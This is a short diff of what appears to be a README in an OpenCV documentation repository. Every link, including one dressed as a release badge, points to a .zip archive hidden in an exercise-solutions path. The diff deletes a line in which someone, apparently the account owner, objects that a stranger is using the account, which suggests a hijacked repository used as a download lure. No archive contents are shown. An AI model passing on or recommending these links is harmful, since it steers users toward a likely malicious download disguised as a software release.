@@ -1,6 +1,5 @@
 https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip
 
-HEY, I DON"T KNOW WHO YOU ARE, WHY ARE YOU USING MY ACCOUNT?
 
 [![Release badge](https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)](https://raw.githubusercontent.com/OjaswithaG/opencv-doc/main/04-Nesne-Tespiti/08-alistirmalar/cozumler/doc_opencv_1.5.zip)
 
